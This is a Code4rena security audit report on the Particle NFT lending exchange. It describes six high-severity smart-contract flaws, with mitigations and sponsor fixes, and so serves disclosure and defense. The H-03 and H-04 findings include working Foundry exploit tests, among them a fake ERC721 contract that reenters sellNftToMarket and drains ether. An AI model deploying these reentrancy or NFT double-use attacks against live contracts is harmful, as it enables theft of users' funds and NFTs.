@@ -1,0 +1,138 @@
+[H-01]ParticleExchange.auctionBuyNftandParticleExchange.withdrawEthWithInterestfunction calls can be DOS’ed
+Submitted byrbserver, also found byd3e4,adriro,bin2chen, andminhquanym
+Whenlien.borroweris a contract, itsreceivefunction can be coded to conditionally revert based on a state boolean variable controlled bylien.borrower’s owner. As long aspayback > 0is true,lien.borrower’sreceivefunction would be called when calling the followingParticleExchange.auctionBuyNftfunction. In this situation, if the owner oflien.borrowerintends to DOS theParticleExchange.auctionBuyNftfunction call, especially whenlien.creditis low or 0, she or he would makelien.borrower’sreceivefunction revert.
+https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L688-L748
+functionauctionBuyNft(Liencalldatalien,uint256lienId,uint256tokenId,uint256amount)externaloverridevalidateLien(lien,lienId)auctionLive(lien) {...// pay PnL to borroweruint256payback=lien.credit+lien.price-payableInterest-amount;if(payback>0) {payable(lien.borrower).transfer(payback);}...}
+Moreover, after the auction of the lien is concluded, calling the followingParticleExchange.withdrawEthWithInterestfunction can calllien.borrower’sreceivefunction, as long aslien.credit > payableInterestis true. In this case, the owner oflien.borrowercan also makelien.borrower’sreceivefunction revert to DOS, theParticleExchange.withdrawEthWithInterestfunction call.
+https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L192-L223
+functionwithdrawEthWithInterest(Liencalldatalien,uint256lienId)externaloverridevalidateLien(lien,lienId) {...uint256payableInterest=_calculateCurrentPayableInterest(lien);// verify that the liquidation condition has met (borrower insolvent or auction concluded)if(payableInterest<lien.credit&& !_auctionConcluded(lien.auctionStartTime)) {revertErrors.LiquidationHasNotReached();}// delete lien (delete first to prevent reentrancy)deleteliens[lienId];// transfer ETH with interest back to lenderpayable(lien.lender).transfer(lien.price+payableInterest);// transfer PnL to borrowerif(lien.credit>payableInterest) {payable(lien.borrower).transfer(lien.credit-payableInterest);}...}
+Similar situations can happen iflien.borrowerdoes not implement thereceiveorfallbackfunction intentionally; in whichlien.borrower’s owner is willing to pay some position margin, which can be a low amount depending on the corresponding lien, to DOS theParticleExchange.auctionBuyNftandParticleExchange.withdrawEthWithInterestfunction calls.
+Proof of Concept
+The following steps can occur for the described scenario for theParticleExchange.auctionBuyNftfunction. The situation for theParticleExchange.withdrawEthWithInterestfunction is similar:
+Alice is the owner oflien.borrowerfor a lien.The lender of the lien starts the auction for the lien.Alice does not want the auction to succeed, so she makeslien.borrower’sreceivefunction revert by changing the controlled state boolean variable for launching the DOS attack to true.For a couple of times during the auction period, some other users are willing to win the auction by supplying an NFT from the same collection, but theirParticleExchange.auctionBuyNftfunction calls all revert.Since no one’sParticleExchange.auctionBuyNfttransaction is executed at the last second of the auction period, the auction is DOS’ed.
+Recommended Mitigation Steps
+TheParticleExchange.auctionBuyNftandParticleExchange.withdrawEthWithInterestfunctions can be updated to record thepaybackandlien.credit - payableInterestamounts that should belong tolien.borrower, instead of directly sending these amounts tolien.borrower. Then, a function can be added to letlien.borrowercall and receive these recorded amounts.
+Assessed type
+DoS
+hansfriese (judge) increased severity to High and commented:
+PoC -> Marked as primary
+wukong-particle (Particle) confirmed, disagreed with severity and commented:
+Acknowledged the issue and agreed with the suggestion. But this might be medium severity since it’s contained with only this borrower’s asset and fund, not speared to the protocol level.
+hansfriese (judge) commented:
+@wukong-particle - For the severity, I suggest High is appropriate.According to C4 guideline:High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).For this vulnerability, a malicious borrower can prevent the lender from taking action for defaulted lien.
+So a borrower can wait as long as he wants and the lender can not claim NFT or ETH.
+The likelihood and the impact are both high. I would like to note that there is no cost to the borrower for this exploit.
+wukong-particle (Particle) commented:
+@hansfriese - thanks for the suggestion, I agree. We can mark this issue as high severity.
+wukong-particle (Particle) commented:
+Fixed. Want to check with you about the changes we made. There are three major modifications here:(1) As suggested, we put the trader earning into a pull based approach — we created amapping(address => uint256) public accountBalance;, and doaccountBalance[account] += gainedAmountfor trader profit. In addition, besidesauctionBuyNftandwithdrawEthWithInterest, we default all trader profit (i.e., frombuyNftFromMarket,repayWithNft) intoaccountBalance, as opposed to a direct transfer back, for consistency.(2) We mergedaccruedInterestintoaccountBalancetoo, for simplicity. So this is like each account has a wallet in the contract. For treasury calculation, we move all calculations into interest accrual time as opposed toaccountBalancewithdrawal time, so that treasury still only takes the interest part, but not the trader gain as before.(3) AtsellNftToMarket, by default the trader will use the balance from the contract as their margin. If the balance is not enough, the trader can choose to top up the margin. Thus, the margin will be an input into the function, as opposed tomsg.value. The logic is as follows:if (margin > msg.value + accountBalance[msg.sender]) {revert Errors.Overspend();}if (margin > msg.value) {// newly deposited value not enough, use from account balanceaccountBalance[msg.sender] -= (margin - msg.value);} else if (margin < msg.value) {// newly deposited value more than enough, top up account balanceaccountBalance[msg.sender] += (msg.value - margin);}
+
+[H-02] Treasury fee is not collected inwithdrawEthWithInterest()
+Submitted byadriro, also found byrbserverandminhquanym
+The Particle exchange collects treasury fees from the lender’s interests. These interests are accumulated in theinterestAccruedmapping and are withdrawn using the_withdrawAccountInterest()function, which splits the portion that corresponds to the treasury.
+https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L231-L246
+231:function_withdrawAccountInterest(addresspayablelender)internal{232:uint256interest=interestAccrued[lender];233:if(interest==0)return;234:235:interestAccrued[lender] =0;236:237:if(_treasuryRate>0) {238:uint256treasuryInterest=MathUtils.calculateTreasuryProportion(interest,_treasuryRate);239:_treasury+=treasuryInterest;240:interest-=treasuryInterest;241:         }242:243:lender.transfer(interest);244:245:emitWithdrawAccountInterest(lender,interest);246:     }
+Lines 238-240 calculate treasury fees and accumulate them in the_treasuryvariable, which is later withdrawn by the owner using thewithdrawTreasury()function.
+However, these fees fail to be considered in the case ofwithdrawEthWithInterest():
+https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L192-L223
+192:functionwithdrawEthWithInterest(Liencalldatalien,uint256lienId)externaloverridevalidateLien(lien,lienId) {193:if(msg.sender!=lien.lender) {194:revertErrors.Unauthorized();195:         }196:197:if(lien.loanStartTime==0) {198:revertErrors.InactiveLoan();199:         }200:201:uint256payableInterest=_calculateCurrentPayableInterest(lien);202:203:// verify that the liquidation condition has met (borrower insolvent or auction concluded)204:if(payableInterest<lien.credit&& !_auctionConcluded(lien.auctionStartTime)) {205:revertErrors.LiquidationHasNotReached();206:         }207:208:// delete lien (delete first to prevent reentrancy)209:deleteliens[lienId];210:211:// transfer ETH with interest back to lender212:payable(lien.lender).transfer(lien.price+payableInterest);213:214:// transfer PnL to borrower215:if(lien.credit>payableInterest) {216:payable(lien.borrower).transfer(lien.credit-payableInterest);217:         }218:219:emitWithdrawETH(lienId);220:221:// withdraw interest from this account too222:_withdrawAccountInterest(payable(msg.sender));223:     }
+As we can see in the previous snippet of code, the interests are calculated in line 201, but that amount is then transferred, along with the lien price, back to the lender in full in line 212, without deducting any treasury fees.
+Recommendation
+The interest can be simply accumulated in theinterestAccruedmapping, which is later withdrawn (correctly taking into account treasury fees) in the already present call to_withdrawAccountInterest().
+functionwithdrawEthWithInterest(Liencalldatalien,uint256lienId)externaloverridevalidateLien(lien,lienId) {if(msg.sender!=lien.lender) {revertErrors.Unauthorized();}if(lien.loanStartTime==0) {revertErrors.InactiveLoan();}uint256payableInterest=_calculateCurrentPayableInterest(lien);// verify that the liquidation condition has met (borrower insolvent or auction concluded)if(payableInterest<lien.credit&& !_auctionConcluded(lien.auctionStartTime)) {revertErrors.LiquidationHasNotReached();}// delete lien (delete first to prevent reentrancy)deleteliens[lienId];+// accrue interest to lender+interestAccrued[lien.lender] +=payableInterest;@// transfer ETH back to lender@payable(lien.lender).transfer(lien.price);// transfer PnL to borrowerif(lien.credit>payableInterest) {payable(lien.borrower).transfer(lien.credit-payableInterest);}emitWithdrawETH(lienId);// withdraw interest from this account too_withdrawAccountInterest(payable(msg.sender));}
+wukong-particle (Particle) acknowledged and commented:
+We will likely fix the issue in another way. We will modifywithdrawNftWithInterestandwithdrawEthWithInterestintowithdrawNftandwithdrawEth, i.e. move the interest withdraw into the single account level interest withdraw function (similar to the suggestion made inhttps://github.com/code-423n4/2023-05-particle-findings/issues/31).
+hansfriese (judge) increased severity to High and commented:
+After discussion, I think that High is the appropriate severity because this issue incurs loss for the protocol.
+wukong-particle (Particle) commented:
+Fixed.
+
+[H-03]_execBuyNftFromMarket()Need to determine if NFT can’t already be in the contract
+Submitted bybin2chen, also found byminhquanym
+Use other Lien’s NFTs for repayment
+Proof of Concept
+_execBuyNftFromMarket()Whether the NFT is in the current contract after the buy, to represent the successful purchase of NFT.
+function_execBuyNftFromMarket(addresscollection,uint256tokenId,uint256amount,uint256useToken,addressmarketplace,bytescalldatatradeData)internal{...if(IERC721(collection).ownerOf(tokenId) !=address(this) ||balanceBefore-address(this).balance!=amount) {revertErrors.InvalidNFTBuy();}}
+But before executing the purchase, it does not determine whether the NFT is already in the contract.
+Since the current protocol does not limit an NFT to only one lien, the_execBuyNftFromMarket()does not actually buy NFT; the funds are used to buy other NFTs, but still meet the verification conditions.
+Example.
+Alice transfers NFT_A to supply Lien[1].Bob performssellNftToMarket(1)and NFT_A is bought by Jack.Jack transfer NFTA and supply Lien[2] (after this NFTA exists in the contract).Bob executesbuyNftFromMarket(1)and spends the same amount corresponding to the purchase of other NFT such as:tradeData = { buy NFT_K }.Step 4 can be passedIERC721(collection).ownerOf(tokenId) ! = address(this) || balanceBefore - address(this).balance ! = amountand Bob gets an additional NFT_K.
+Test code:
+functiontestOneNftTwoLien()external{//0.lender supply lien[0]_approveAndSupply(lender,_tokenId);//1.borrower sell to market_rawSellToMarketplace(borrower,address(dummyMarketplace),0,_sellAmount);//2.jack buy nftaddressjack=address(0x100);vm.startPrank(jack);dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);vm.stopPrank();//3.jack  supply lien[1]_approveAndSupply(jack,_tokenId);//4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nftOtherDummyERC721otherDummyERC721=newOtherDummyERC721("otherNft","otherNft");otherDummyERC721.mint(address(dummyMarketplace),1);console.log("before borrower balance:",borrower.balance/1ether);console.log("before otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);bytesmemorytradeData=abi.encodeWithSignature("buyFromMarket(address,address,uint256)",borrower,address(otherDummyERC721),//<--------buy other nft1);vm.startPrank(borrower);particleExchange.buyNftFromMarket(_activeLien,0,_tokenId,_sellAmount,0,address(dummyMarketplace),tradeData);vm.stopPrank();//5.show borrower get 10 ether back , and get  other nftconsole.log("after borrower balance:",borrower.balance/1ether);console.log("after otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);}contractOtherDummyERC721isERC721{// solhint-disable-next-line no-empty-blocksconstructor(stringmemoryname,stringmemorysymbol)ERC721(name,symbol) {}functionmint(addressto,uint256tokenId)external{_safeMint(to,tokenId);}}
+$ forge test --match testOneNftTwoLien  -vvv[PASS] testOneNftTwoLien() (gas: 1466296)Logs:before borrower balance: 0before otherDummyERC721's owner is borrower : falseafter borrower balance: 10after otherDummyERC721's owner is borrower : trueTest result: ok. 1 passed; 0 failed; finished in 6.44ms
+Recommended Mitigation Steps
+_execBuyNftFromMarketto determine theownerOf()is not equal to the contract address before buying.
+function_execBuyNftFromMarket(addresscollection,uint256tokenId,uint256amount,uint256useToken,addressmarketplace,bytescalldatatradeData)internal{if(!registeredMarketplaces[marketplace]) {revertErrors.UnregisteredMarketplace();}+require(IERC721(collection).ownerOf(tokenId) !=address(this),"NFT is already in contract ")...
+Assessed type
+Context
+hansfriese (judge) commented:
+PoC -> Marked as primary
+wukong-particle (Particle) confirmed and commented:
+Fixed.
+
+[H-04]_execSellNftToMarket()re-enter steal funds
+Submitted bybin2chen
+Proof of Concept
+_execSellNftToMarket()The number of changes in the balance to represent whether the corresponding amount has been received.
+function_execSellNftToMarket(addresscollection,uint256tokenId,uint256amount,boolpushBased,addressmarketplace,bytescalldatatradeData)internal{...if(IERC721(collection).ownerOf(tokenId) ==address(this) ||address(this).balance-ethBefore-wethBefore!=amount) {revertErrors.InvalidNFTSell();}
+Since the current contract doesn’t have anynonReentrantrestrictions, the user can usereentrantand pay only once when multiple_execSellNftToMarket()s share the same transfer of funds.
+Here are some examples:
+Alice supplies a fake NFT_A.Alice executessellNftToMarket(), assumingsellAmount=10.execSellNftToMarket()inside theIERC721(collection).safeTransferFrom()for re-entry.Note: The collection is an arbitrary contract, sosafeTransferFrom()can be any code.Reenter the execution of another Lien’ssellNftToMarket(), and really transfer toamount=10.After the above re-entry, go back to step 3. This step does not need to actually pay, because step 4 has been transferred tosellAmount = 10, so it can pass this verificationaddress(this).balance - ethBefore - wethBefore ! = amountso that only one payment is made, reaching thesellNftToMarket()twice.
+Test code:
+add to ParticleExchange.t.sol
+functiontestReenter()public{vm.deal(address(particleExchange),100ether);FakeERC721fakeERC721=newFakeERC721(particleExchange,address(dummyMarketplace),"fake","fake");vm.deal(address(fakeERC721),10ether);fakeERC721.execSteal();}contractFakeERC721isERC721{ParticleExchangeprivateparticleExchange;addressprivatemarketplace;uintsellAmount=10ether;constructor(ParticleExchange_particleExchange,address_marketplace,stringmemoryname,stringmemorysymbol)ERC721(name,symbol) {particleExchange=_particleExchange;marketplace=_marketplace;}functionmint(addressto,uint256tokenId)external{_safeMint(to,tokenId);}functionexecSteal()external{//0. mint nft and supply lienuint256tokenId=1;_mint(address(this),tokenId);_mint(address(this),tokenId+1);_setApprovalForAll(address(this),address(particleExchange),true);//console.log(isApprovedForAll(address(this),address(particleExchange)));uint256lienId=particleExchange.supplyNft(address(this),tokenId,sellAmount,0);uint256lienId2=particleExchange.supplyNft(address(this),tokenId+1,sellAmount,0);uint256particleExchangeBefore=address(particleExchange).balance;uint256fakeNftBefore=address(this).balance;console.log("before particleExchange balance:",particleExchangeBefore/1ether);console.log("before fakeNft balance:",fakeNftBefore/1ether);//1.sell , reenter pay one but sell two liensell(lienId,tokenId,sellAmount);//2. repay lien 1 get 10 ether fundsparticleExchange.repayWithNft(Lien({lender:address(this),borrower:address(this),collection:address(this),tokenId:tokenId,price:sellAmount,rate:0,loanStartTime:block.timestamp,credit:0,auctionStartTime:0}),lienId,tokenId);//3. repay lien 2 get 10 ether fundsparticleExchange.repayWithNft(Lien({lender:address(this),borrower:address(this),collection:address(this),tokenId:tokenId+1,price:sellAmount,rate:0,loanStartTime:block.timestamp,credit:0,auctionStartTime:0}),lienId2,tokenId+1);//4.show fakeNft steal fundsconsole.log("after particleExchange balance:",address(particleExchange).balance/1ether);console.log("after fakeNft balance:",address(this).balance/1ether);console.log("after particleExchange lost:",(particleExchangeBefore-address(particleExchange).balance)/1ether);console.log("after fakeNft steal:",(address(this).balance-fakeNftBefore) /1ether);}functionsell(uint256lienId,uint256tokenId,uint256sellAmount)private{bytesmemorytradeData=abi.encodeWithSignature("sellToMarket(address,address,uint256,uint256)",address(particleExchange),address(this),tokenId,sellAmount);particleExchange.sellNftToMarket(Lien({lender:address(this),borrower:address(0),collection:address(this),tokenId:tokenId,price:sellAmount,rate:0,loanStartTime:0,credit:0,auctionStartTime:0}),lienId,sellAmount,true,marketplace,tradeData);}functionsafeTransferFrom(addressfrom,addressto,uint256tokenId,bytesmemorydata)publicvirtualoverride{if(from==address(particleExchange)){if(tokenId==1) {//tokenId =1 , reenter , don't paysell(1,tokenId+1,sellAmount);}else{// tokenId = 2 ,real paypayable(address(particleExchange)).transfer(sellAmount);}}_transfer(_ownerOf(tokenId),to,tokenId);//anyone can transfer}fallback()externalpayable{}}
+$ forge test --match testReenter  -vvvRunning 1 test for test/ParticleExchange.t.sol:ParticleExchangeTest[PASS] testReenter() (gas: 1869563)Logs:before particleExchange balance: 100before fakeNft balance: 10after particleExchange balance: 90after fakeNft balance: 20after particleExchange lost: 10after fakeNft steal: 10
+Test result: ok. 1 passed; 0 failed; finished in 4.80ms
+Recommended Mitigation Steps
+AddnonReentrantrestrictions to all Lien-related methods.
+Assessed type
+Reentrancy
+hansfriese (judge) commented:
+Good finding!
+wukong-particle (Particle) confirmed and commented:
+Fixed.
+
+[H-05] withdrawNftWithInterest() possible take away other Lien’s NFT
+Submitted bybin2chen, also found byrbserver,d3e4, andminhquanym
+Proof of Concept
+withdrawNftWithInterest()is used to retrieve NFT. The only current restriction is if you can transfer out of NFT, it means an inactive loan.
+functionwithdrawNftWithInterest(Liencalldatalien,uint256lienId)externaloverridevalidateLien(lien,lienId) {if(msg.sender!=lien.lender) {revertErrors.Unauthorized();}// delete liendeleteliens[lienId];// transfer NFT back to lender/// @dev can withdraw means NFT is currently in contract without active loan,/// @dev the interest (if any) is already accured to lender at NFT acquiring timeIERC721(lien.collection).safeTransferFrom(address(this),msg.sender,lien.tokenId);...
+However, the current protocol does not restrict the existence of only one Lien in the same NFT.
+For example, the following scenario.
+Alice transfers NFT_A and supply Lien[1].Bob executessellNftToMarket().Jack buys NFT_A from the market.Jack transfers NFT_A and supply Lien[2].Alice executingwithdrawNftWithInterest(1)is able to get NFTA successfully (because step 4 NFTA is already in the contract). This results in the deletion of lien[1], and Lien[2]‘s NFT_A is transferred away.
+The result is: Jack’s NFT is lost and Bob’s funds are also lost.
+Recommended Mitigation Steps
+Need to determine whether there is a Loan
+functionwithdrawNftWithInterest(Liencalldatalien,uint256lienId)externaloverridevalidateLien(lien,lienId) {if(msg.sender!=lien.lender) {revertErrors.Unauthorized();}+require(lien.loanStartTime==0,"Active Loan");
+Assessed type
+Context
+adriro (warden) commented:
+Nice finding
+wukong-particle (Particle) confirmed and commented:
+Fixed.
+
+[H-06] Marketplace may callonERC721Received()and create a lien duringbuyNftFromMarket(), creating divergence
+Submitted byminhquanym
+The contract supports a “push-based” NFT supply, where the price and rate are embedded in the data bytes. This way, the lender doesn’t need to additionally approve the NFT, but can just transfer it directly to the contract. However, since the contract also interacts with the marketplace to buy/sell NFT, it has to prevent the issue where the marketplace also sends data bytes, which might tie 1 NFT with 2 different liens and create divergence.
+functiononERC721Received(addressoperator,addressfrom,uint256tokenId,bytescalldatadata)externalreturns(bytes4) {if(data.length==64) {// @audit marketplace is router so the executor contract might not be whitelistedif(registeredMarketplaces[operator]) {/// @dev transfer coming from registeredMarketplaces will go through buyNftFromMarket, where the NFT/// is matched with an existing lien (realize PnL) already. If procceds here, this NFT will be tied/// with two liens, which creates divergence.revertErrors.Unauthorized();}/// @dev MAX_PRICE and MAX_RATE should each be way below bytes32(uint256price,uint256rate) =abi.decode(data, (uint256,uint256));/// @dev the msg sender is the NFT collection (called by safeTransferFrom's _checkOnERC721Received check)_supplyNft(from,msg.sender,tokenId,price,rate);}returnthis.onERC721Received.selector;}
+The contract prevents it by using theregisteredMarketplaces[]mapping, where it records the address of the marketplace. This check is explicitly commented in the codebase.
+However, this is not enough. The protocol plans to integrate with Reservoir’s Router contract, so only the Router address is whitelisted inregisteredMarketplaces[]. But the problem is, the address that transfers the NFT is not the Router, but the specific Executor contract, which is not whitelisted.
+As a result, the marketplace might bypass this check and create a new lien inonERC721Received()during thebuyNftFromMarket()flow, thus making 2 liens track the same NFT.
+Proof of Concept
+Function_execBuyNftFromMarket()does a low-level call to the exchange.
+// execute raw order on registered marketplaceboolsuccess;if(useToken==0) {// use ETH// solhint-disable-next-line avoid-low-level-calls(success, ) =marketplace.call{value:amount}(tradeData);}elseif(useToken==1) {// use WETHweth.deposit{value:amount}();weth.approve(marketplace,amount);// solhint-disable-next-line avoid-low-level-calls(success, ) =marketplace.call(tradeData);}
+The contract calls to Reservoir’s router contract, which then calls to a specific module to execute the buy.
+https://github.com/reservoirprotocol/indexer/blob/6c89d546d3fb98d5eaa505b9943e89bd91f2e8ec/packages/contracts/contracts/router/ReservoirV6_0_1.sol#L50
+function_executeInternal(ExecutionInfocalldataexecutionInfo)internal{addressmodule=executionInfo.module;// Ensure the target is a contractif(!module.isContract()) {revertUnsuccessfulExecution();}(boolsuccess, ) =module.call{value:executionInfo.value}(executionInfo.data);if(!success) {revertUnsuccessfulExecution();}}
+Recommended Mitigation Steps
+Consider adding a flag that indicates the contract is in thebuyNftFromMarket()flow and use it as a check inonERC721Received(). For example:
+_marketBuyFlow=1;_execBuyNftFromMarket(lien.collection,tokenId,amount,useToken,marketplace,tradeData);_marketBuyFlow=0;
+And inonERC721Receive():
+if(data.length==64) {if(_martketBuyFlow) {returnthis.onERC721Received.selector;}}
+Assessed type
+Invalid Validation
+wukong-particle (Particle) confirmed and commented:
+We are considering addingReentrancyGaurdaround all functions that modify the lien (to prevent other issues likehttps://github.com/code-423n4/2023-05-particle-findings/issues/14). Here, we should be able to re-use theReentrancyGaurdvariable to prevent divergence.So something like this:buyNftFromMarket(...) external payable override validateLien(Lien, LienId) nonReentrant {...}inonERC721Received:if (data.length == 64) {if(_status === _ENTERED) {revert Errors.Unauthorized();}}We will need to modify _status to beinternalinstead ofprivatefrom Openzeppelin’s originalReentrancyGaurd.sol.
+wukong-particle (Particle) commented:
+Fixed.
+
